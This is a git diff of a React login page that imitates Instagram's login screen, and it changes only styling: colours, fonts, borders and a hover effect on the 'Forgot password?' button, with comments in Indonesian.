@@ -117,8 +117,11 @@ export default function LoginPage({ onLoginSuccess }: LoginProps) {
           height: 100vh !important;
           max-height: 100vh !important;
           overflow: hidden !important;
-          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+          /* Tipografi 8.3: Inter / -apple-system */
+          font-family: "Inter", -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif !important;
           background: #ffffff;
+          /* Palet Warna 8.2: Primary Text #262626 */
+          color: #262626 !important;
         }
         
         ::-webkit-scrollbar {
@@ -142,7 +145,7 @@ export default function LoginPage({ onLoginSuccess }: LoginProps) {
           background: transparent; 
           padding: 0 4px;
           font-size: 14px;
-          color: #9ca3af;
+          color: #737373;
           font-weight: normal;
         }
         .input-wrapper input:focus ~ label,
@@ -157,7 +160,7 @@ export default function LoginPage({ onLoginSuccess }: LoginProps) {
         /* Mengunci warna background putih murni ketika autofill browser aktif */
         .input-wrapper input:-webkit-autofill {
           -webkit-box-shadow: 0 0 0px 1000px #ffffff inset !important;
-          -webkit-text-fill-color: #1f2937 !important;
+          -webkit-text-fill-color: #262626 !important;
           transition: background-color 5000s ease-in-out 0s;
         }
 
@@ -169,21 +172,23 @@ export default function LoginPage({ onLoginSuccess }: LoginProps) {
           width: 100%;
           font-size: 14px;
           padding: 20px 16px 8px 16px;
-          border: 1.5px solid #e5e7eb;
+          /* Palet Warna 8.2: Border #DBDBDB */
+          border: 1.5px solid #DBDBDB;
           border-radius: 16px;
-          background: #ffffff !important; /* Memaksa warna putih murni */
+          background: #ffffff !important; 
           outline: none;
-          color: #1f2937;
+          color: #262626;
           box-sizing: border-box;
           transition: border-color 0.2s, box-shadow 0.2s;
         }
         .custom-input:hover:not(:focus) {
-          border-color: #9ca3af;
+          border-color: #a8a8a8;
         }
         .custom-input:focus {
-          border-color: #0095f6 !important;
-          background-color: #ffffff !important; /* Menjaga tetap putih saat fokus */
-          box-shadow: 0 0 0 3px rgba(71, 150, 236, 0.15);
+          /* Palet Warna 8.2: Action Blue #0095F6 */
+          border-color: #0095F6 !important;
+          background-color: #ffffff !important; 
+          box-shadow: 0 0 0 3px rgba(0, 149, 246, 0.15);
         }
         .custom-input::placeholder {
           color: transparent;
@@ -193,7 +198,7 @@ export default function LoginPage({ onLoginSuccess }: LoginProps) {
         .btn-primary {
           width: 100%;
           padding: 14px 0;
-          color: white;
+          color: white !important;
           font-size: 14px;
           font-weight: 600;
           border: none;
@@ -205,11 +210,12 @@ export default function LoginPage({ onLoginSuccess }: LoginProps) {
           transition: background 0.2s, opacity 0.2s;
         }
         .btn-primary:not(:disabled) {
-          background: #4796ec;
+          /* Palet Warna 8.2: Action Blue #0095F6 */
+          background: #0095F6;
           cursor: pointer;
         }
         .btn-primary:not(:disabled):hover {
-          background: #2563eb;
+          background: #1877F2;
         }
         .btn-primary:disabled {
           background: #b2d4f7;
@@ -220,7 +226,8 @@ export default function LoginPage({ onLoginSuccess }: LoginProps) {
         .btn-google-login {
           width: 100%;
           padding: 12px 0;
-          border: 1px solid #d1d5db;
+          /* Palet Warna 8.2: Border #DBDBDB */
+          border: 1px solid #DBDBDB;
           border-radius: 9999px;
           display: flex;
           align-items: center;
@@ -228,7 +235,7 @@ export default function LoginPage({ onLoginSuccess }: LoginProps) {
           gap: 8px;
           font-size: 14px;
           font-weight: 600;
-          color: #1f2937;
+          color: #262626;
           background: #ffffff;
           cursor: pointer;
           transition: background 0.2s;
@@ -240,9 +247,10 @@ export default function LoginPage({ onLoginSuccess }: LoginProps) {
         .btn-outline-blue {
           width: 100%;
           padding: 12px 0;
-          border: 1px solid #3b82f6;
+          /* Palet Warna 8.2: Action Blue #0095F6 */
+          border: 1px solid #0095F6;
           border-radius: 9999px;
-          color: #3b82f6;
+          color: #0095F6;
           font-size: 14px;
           font-weight: 600;
           text-align: center;
@@ -320,7 +328,7 @@ export default function LoginPage({ onLoginSuccess }: LoginProps) {
             <h1 style={{
               fontSize: "60px",
               fontWeight: 400,
-              color: "#000000",
+              color: "#262626",
               lineHeight: 1.25,
               textAlign: "center",
               marginBottom: "40px",
@@ -372,7 +380,7 @@ export default function LoginPage({ onLoginSuccess }: LoginProps) {
 
           {/* ── SEKSI KANAN: FORM PANEL LOGIN ── */}
           <div style={{
-            borderLeft: "1px solid #dbdbdb",
+            borderLeft: "1px solid #DBDBDB",
             background: "#ffffff",
             display: "flex",
             flexDirection: "column",
@@ -384,7 +392,7 @@ export default function LoginPage({ onLoginSuccess }: LoginProps) {
           }}>
             <div style={{ width: "100%", maxWidth: "540px", display: "flex", flexDirection: "column" }}>
 
-              <h2 style={{ textAlign: "left", fontSize: "20px", fontWeight: 600, color: "#1f2937", marginBottom: "24px", paddingLeft: "4px" }}>
+              <h2 style={{ textAlign: "left", fontSize: "20px", fontWeight: 600, color: "#262626", marginBottom: "24px", paddingLeft: "4px" }}>
                 Log into Instagram
               </h2>
 
@@ -430,7 +438,7 @@ export default function LoginPage({ onLoginSuccess }: LoginProps) {
                       style={{
                         position: "absolute", right: 16, padding: "4px",
                         background: "transparent", border: "none", cursor: "pointer",
-                        display: "flex", alignItems: "center", justifyContent: "center", color: "#6b7280"
+                        display: "flex", alignItems: "center", justifyContent: "center", color: "#262626"
                       }}
                     >
                       {showPassword ? (
@@ -447,7 +455,7 @@ export default function LoginPage({ onLoginSuccess }: LoginProps) {
                   )}
                 </div>
 
-                {/* Tombol Login — Sekarang terkunci otomatis jika password < 6 karakter */}
+                {/* Tombol Login */}
                 <button
                   type="submit"
                   disabled={!isFormValid || isLoading}
@@ -457,11 +465,27 @@ export default function LoginPage({ onLoginSuccess }: LoginProps) {
                 </button>
               </form>
 
-              <button type="button" style={{
-                fontSize: "14px", fontWeight: 500, color: "#1f2937", background: "transparent",
-                border: "none", cursor: "pointer", marginTop: "20px", marginBottom: "40px",
-                textAlign: "center", paddingLeft: "4px"
-              }}>
+              <button
+                type="button"
+                style={{
+                  fontSize: "14px",
+                  fontWeight: 500,
+                  color: "#262626", // Menggunakan teks hitam sesuai keinginanmu sebelumnya
+                  background: "transparent",
+                  border: "none",
+                  borderRadius: "9999px", // Membuat sudut melengkung oval sempurna saat di-hover
+                  padding: "12px 0", // Memberikan ruang atas-bawah agar berbentuk kapsul
+                  cursor: "pointer",
+                  marginTop: "20px",
+                  marginBottom: "40px",
+                  textAlign: "center",
+                  width: "100%", // Melebarkan tombol agar sama rata dengan tombol "Log in"
+                  transition: "background-color 0.15s ease"
+                }}
+                // Efek hover untuk mengubah background menjadi abu-abu tanpa memunculkan underline
+                onMouseEnter={(e) => e.currentTarget.style.backgroundColor = "#EFEFEF"}
+                onMouseLeave={(e) => e.currentTarget.style.backgroundColor = "transparent"}
+              >
                 Forgot password?
               </button>
 
@@ -497,7 +521,7 @@ export default function LoginPage({ onLoginSuccess }: LoginProps) {
                   style={{ width: "24px", height: "auto", objectFit: "contain" }}
                   onError={(e) => { e.currentTarget.style.display = "none"; }}
                 />
-                <span style={{ fontSize: "14px", fontWeight: 600, color: "#374151", letterSpacing: "0.05em" }}>Meta</span>
+                <span style={{ fontSize: "14px", fontWeight: 600, color: "#262626", letterSpacing: "0.05em" }}>Meta</span>
               </div>
 
             </div>
@@ -513,7 +537,7 @@ export default function LoginPage({ onLoginSuccess }: LoginProps) {
           boxSizing: "border-box",
           borderTop: "1px solid #f1f1f1"
         }}>
-          <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "12px",width :"100%", marginTop: "-12px", justifyContent: "flex-start", boxSizing: "border-box", padding: "0 20px" }}>
+          <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "12px", width: "100%", marginTop: "-12px", justifyContent: "flex-start", boxSizing: "border-box", padding: "0 20px" }}>
             <div style={{ display: "flex", flexWrap: "wrap", justifyContent: "center", gap: "4px 16px", width: "100%", maxWidth: "1200px" }}>
               {["Meta", "About", "Blog", "Jobs", "Help", "API", "Privacy", "Terms", "Locations", "Popular", "Instagram Lite", "Meta AI", "Threads", "Contact Uploading & Non-Users", "Meta Verified", "Meta in indonesia"].map((item) => (
                 <a key={item} href="#" style={{ fontSize: "12px", color: "#737373", textDecoration: "none" }}>
@@ -542,21 +566,21 @@ export default function LoginPage({ onLoginSuccess }: LoginProps) {
                     <option value="fr">Français</option>
                     <option value="ja">日本語</option>
                   </select>
-                  <svg 
-                    width="10" 
-                    height="10" 
-                    viewBox="0 0 24 24" 
-                    fill="none" 
-                    stroke="#737373" 
-                    strokeWidth="2.5" 
-                    strokeLinecap="round" 
-                    strokeLinejoin="round" 
-                    style={{ 
-                      pointerEvents: "none", 
-                      position: "absolute", 
-                      right: "0px", 
-                      top: "50%", 
-                      transform: "translateY(-50%)" 
+                  <svg
+                    width="10"
+                    height="10"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="#737373"
+                    strokeWidth="2.5"
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                    style={{
+                      pointerEvents: "none",
+                      position: "absolute",
+                      right: "0px",
+                      top: "50%",
+                      transform: "translateY(-50%)"
                     }}
                   >
                     <polyline points="6 9 12 15 18 9"></polyline>
